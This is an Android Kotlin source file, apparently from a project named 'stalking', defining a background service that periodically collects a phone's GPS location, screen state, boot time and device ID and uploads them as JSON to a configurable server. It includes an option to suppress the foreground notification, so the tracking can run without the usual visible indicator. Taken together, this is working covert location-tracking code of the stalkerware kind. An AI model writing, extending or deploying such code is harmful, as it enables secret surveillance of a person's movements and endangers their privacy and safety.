package github.shua_github.stalking

import android.Manifest
import android.annotation.SuppressLint
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.location.Location
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.os.PowerManager
import android.os.SystemClock
import android.provider.Settings
import android.util.Log
import androidx.annotation.RequiresPermission
import androidx.core.app.NotificationCompat
import com.google.android.gms.location.FusedLocationProviderClient
import com.google.android.gms.location.LocationServices
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.ExperimentalCoroutinesApi
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.suspendCancellableCoroutine
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import androidx.core.content.edit

class MonitorService : Service() {
    private val channelId = "monitor_service_channel"
    private val notificationId = 1
    private lateinit var fusedLocationClient: FusedLocationProviderClient
    private val client = OkHttpClient()
    private var job: Job? = null
    private val scope = CoroutineScope(Dispatchers.IO)
    private var uploadCount = 0
    private var startTime: Long = 0L
    private var disableNotification = false
    private var disableCache = false
    private var lastLocation: Map<String, Any?>? = null
    private var handler: Handler? = null
    private var aliveSeconds: Long = 0L

    override fun onCreate() {
        super.onCreate()
        val prefs = getSharedPreferences("config", MODE_PRIVATE)
        disableNotification = prefs.getBoolean("disableNotification", false)
        disableCache = prefs.getBoolean("disableCache", false)
        createNotificationChannel()
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
        handler = Handler(Looper.getMainLooper())
    }

    @SuppressLint("MissingPermission")
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startTime = System.currentTimeMillis() / 1000
        aliveSeconds = 0L
        val prefs = getSharedPreferences("config", MODE_PRIVATE)
        val serverUrl = prefs.getString("serverUrl", "") ?: ""
        val interval = prefs.getLong("interval", 60L)
        disableNotification = prefs.getBoolean("disableNotification", false)
        disableCache = prefs.getBoolean("disableCache", false)
        if (!disableNotification) {
            startForeground(notificationId, buildNotification())
        }
        job?.cancel()
        job = scope.launch @RequiresPermission(Manifest.permission.ACCESS_NETWORK_STATE) {
            while (true) {
                collectAndUpload(serverUrl)
                delay(interval * 1000)
            }
        }
        handler?.removeCallbacksAndMessages(null)
        handler?.post(object : Runnable {
            override fun run() {
                val newAlive = (System.currentTimeMillis() / 1000 - startTime)
                if (newAlive != aliveSeconds) {
                    aliveSeconds = newAlive
                    broadcastStatus()
                }
                handler?.postDelayed(this, 1000)
            }
        })
        return START_STICKY
    }

    override fun onDestroy() {
        job?.cancel()
        handler?.removeCallbacksAndMessages(null)
        // 先发送所有字段为"-"的状态广播
        val resetIntent = Intent("action_monitor_status_update").apply {
            setPackage(packageName)
            putExtra("uploadCount", "-")
            putExtra("aliveSeconds", "-")
            putExtra("disableNotification", "-")
            putExtra("disableCache", "-")
        }
        sendBroadcast(resetIntent)
        // 再发送服务停止广播
        val stopIntent = Intent("action_monitor_service_stopped")
        sendBroadcast(stopIntent)
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun buildNotification(): Notification {
        return NotificationCompat.Builder(this, channelId)
            .setContentTitle("监控服务运行中")
            .setContentText("正在收集设备信息... 已上报 $uploadCount 次, 存活 $aliveSeconds 秒")
            .setSmallIcon(android.R.drawable.ic_menu_mylocation)
            .setOngoing(true)
            .build()
    }

    private fun createNotificationChannel() {
        val channel = NotificationChannel(channelId, "监控服务", NotificationManager.IMPORTANCE_LOW)
        val manager = getSystemService(NotificationManager::class.java)
        manager.createNotificationChannel(channel)
    }

    @RequiresPermission(allOf = [Manifest.permission.ACCESS_NETWORK_STATE, Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION])
    private suspend fun collectAndUpload(serverUrl: String) {
        val info = collectInfo()
        if (serverUrl.isNotBlank()) {
            uploadToServer(serverUrl, info)
        }
    }

    @RequiresPermission(allOf = [Manifest.permission.ACCESS_NETWORK_STATE, Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION])
    private suspend fun collectInfo(): Map<String, Any?> {
        val location = if (disableCache) getLocation(true) else getLocation(false)
        val isOnline = this.isScreenON()
        val bootTime = this.getBootTime()
        val time = System.currentTimeMillis() / 1000
        val deviceId = this.getUniqueDeviceId()
        return mapOf(
            "type" to "device_info",
            "data" to mapOf(
                "time" to time,
                "lat" to location["lat"],
                "lng" to location["lng"],
                "isOnline" to isOnline,
                "bootTime" to bootTime,
                "deviceId" to deviceId,
                "uploadCount" to uploadCount,
                "aliveSeconds" to aliveSeconds
            )
        )
    }

    @SuppressLint("ServiceCast")
    private fun isScreenON(): Boolean {
        val pm = getSystemService(POWER_SERVICE) as PowerManager
        return pm.isInteractive
    }

    @RequiresPermission(allOf = [Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION])
    @OptIn(ExperimentalCoroutinesApi::class)
    private suspend fun getLocation(forceFresh: Boolean = false): Map<String, Any?> {
        if (!forceFresh && lastLocation != null) {
            return lastLocation!!
        }
        val fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
        return try {
            val location = suspendCancellableCoroutine<Location?> { cont ->
                fusedLocationClient.lastLocation
                    .addOnSuccessListener { cont.resume(it, null) }
                    .addOnFailureListener { cont.resume(null, null) }
            }
            val result = if (location != null) {
                mapOf("lat" to location.latitude, "lng" to location.longitude)
            } else {
                val freshLocation = suspendCancellableCoroutine<Location?> { cont ->
                    fusedLocationClient.getCurrentLocation(
                        com.google.android.gms.location.Priority.PRIORITY_HIGH_ACCURACY,
                        null
                    ).addOnSuccessListener { cont.resume(it, null) }
                     .addOnFailureListener { cont.resume(null, null) }
                }
                if (freshLocation != null) {
                    mapOf("lat" to freshLocation.latitude, "lng" to freshLocation.longitude)
                } else {
                    mapOf("lat" to null, "lng" to null)
                }
            }
            if (!forceFresh) lastLocation = result
            result
        } catch (e: Exception) {
            e.printStackTrace()
            mapOf("lat" to null, "lng" to null)
        }
    }

    private fun getBootTime(): Long {
        return (System.currentTimeMillis() - SystemClock.elapsedRealtime()) / 1000
    }

    @SuppressLint("HardwareIds")
    fun getUniqueDeviceId(): String? {
        return Settings.Secure.getString(this.contentResolver, Settings.Secure.ANDROID_ID)
    }

    private fun uploadToServer(serverUrl: String, info: Map<String, Any?>) {
        try {
            val body = JSONObject(info).toString().toRequestBody("application/json".toMediaTypeOrNull())
            val req = Request.Builder().url(serverUrl).post(body).build()
            val response = client.newCall(req).execute()
            Log.d("MonitorService", "Upload response code: ${response.code}")
            Log.d("MonitorService", "Response body: ${response.body?.string()}")
            response.close()
            uploadCount++
            val prefs = getSharedPreferences("config", MODE_PRIVATE)
            aliveSeconds = (System.currentTimeMillis() / 1000 - startTime)
            prefs.edit {
                putInt("uploadCount", uploadCount)
                    .putLong("aliveSeconds", aliveSeconds)
            }
            broadcastStatus()
        } catch (e: Exception) {
            Log.e("MonitorService", "Upload failed: ${e.message}", e)
        }
    }

    private fun broadcastStatus() {
        val statusMap = mutableMapOf<String, Any?>()
        statusMap["uploadCount"] = uploadCount
        statusMap["aliveSeconds"] = aliveSeconds
        statusMap["disableNotification"] = disableNotification
        statusMap["disableCache"] = disableCache
        val lat = lastLocation?.get("lat")
        val lng = lastLocation?.get("lng")
        statusMap["lat"] = lat
        statusMap["lng"] = lng
        val updateIntent = Intent("action_monitor_status_update").apply {
            setPackage(packageName)
            putExtra("statusMap", HashMap(statusMap))
        }
        sendBroadcast(updateIntent)
        if (!disableNotification) {
            startForeground(notificationId, buildNotification())
        }
    }

}
